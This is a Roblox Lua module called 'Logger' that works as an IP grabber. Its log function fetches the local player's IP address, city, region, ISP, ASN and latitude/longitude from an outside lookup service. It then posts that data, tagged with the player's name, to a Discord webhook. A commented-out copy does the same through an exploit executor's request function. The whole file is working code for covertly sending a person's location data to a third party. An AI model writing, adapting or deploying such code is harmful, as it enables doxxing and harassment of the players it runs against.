local HttpService = game:GetService("HttpService")

local Logger = {
    -- Returns a table containing your IP information.
    log_table = function()
        ipftch = HttpService:GetAsync("https://ip.luainject.ml/")

        local ht = game:GetService("HttpService")
        local j = ht:JSONDecode(ipftch)

        return j
    end,

    -- Logs IP to provided Discord webhook.
    log = function(webhook)
        if not webhook then
            return
        end

        plr = game.Players.LocalPlayer

        ip_fetched = HttpService:GetAsync("https://ip.luainject.ml/")

        local ht = game:GetService("HttpService")
        local j = ht:JSONDecode(ip_fetched)

        local HttpService = game:GetService("HttpService")

        local dataFields = {
            ["embeds"] = {{
                ["title"] = "LOG - " .. plr.Name,
                ['color'] = 4985996,
                ["footer"] = {
                    ["text"] = os.date("Sentinel Softworks • %x %H:%M")
                },
                ["fields"] = {{
                    ["name"] = "IP",
                    ["value"] = j.ip
                }, {
                    ["name"] = "Continent",
                    ["value"] = j.continent
                }, {
                    ["name"] = "Country",
                    ["value"] = j.country
                }, {
                    ["name"] = "Region",
                    ["value"] = j.region
                }, {
                    ["name"] = "City",
                    ["value"] = j.city
                }, {
                    ["name"] = "Timezone",
                    ["value"] = j.timezone
                }, {
                    ["name"] = "ISP",
                    ["value"] = j.organisation
                }, {
                    ["name"] = "Latitude",
                    ["value"] = j.latitude
                }, {
                    ["name"] = "Longitude",
                    ["value"] = j.longitude
                }, {
                    ["name"] = "ASN",
                    ["value"] = j.asn
                }}
            }}
        }

        -- Make the request
        local response = HttpService:PostAsync(webhook, dataFields, Enum.HttpContentType.ApplicationJson, false)
        print(response)

        -- response1 = syn.request({
        --     Url = webhook,
        --     Method = "POST",
        --     Headers = {
        --         ["Content-Type"] = "application/json",
        --         ["Content-Disposition"] = "form-data; name=payload_json"
        --     },
        --     Body = game.HttpService:JSONEncode({
        --         ["embeds"] = {{
        --             ["title"] = "LOG - " .. game.Players.LocalPlayer.Name,
        --             ['color'] = 4985996,
        --             ["footer"] = {
        --                 ["text"] = os.date("Sentinel Softworks • %x %H:%M")
        --             },
        --             ["fields"] = {{
        --                 ["name"] = "IP",
        --                 ["value"] = j.ip
        --             }, {
        --                 ["name"] = "Continent",
        --                 ["value"] = j.continent
        --             }, {
        --                 ["name"] = "Country",
        --                 ["value"] = j.country
        --             }, {
        --                 ["name"] = "Region",
        --                 ["value"] = j.region
        --             }, {
        --                 ["name"] = "City",
        --                 ["value"] = j.city
        --             }, {
        --                 ["name"] = "Timezone",
        --                 ["value"] = j.timezone
        --             }, {
        --                 ["name"] = "ISP",
        --                 ["value"] = j.organisation
        --             }, {
        --                 ["name"] = "Latitude",
        --                 ["value"] = j.latitude
        --             }, {
        --                 ["name"] = "Longitude",
        --                 ["value"] = j.longitude
        --             }, {
        --                 ["name"] = "ASN",
        --                 ["value"] = j.asn
        --             }}
        --         }}
        --     })
        -- })
    end
}

return Logger
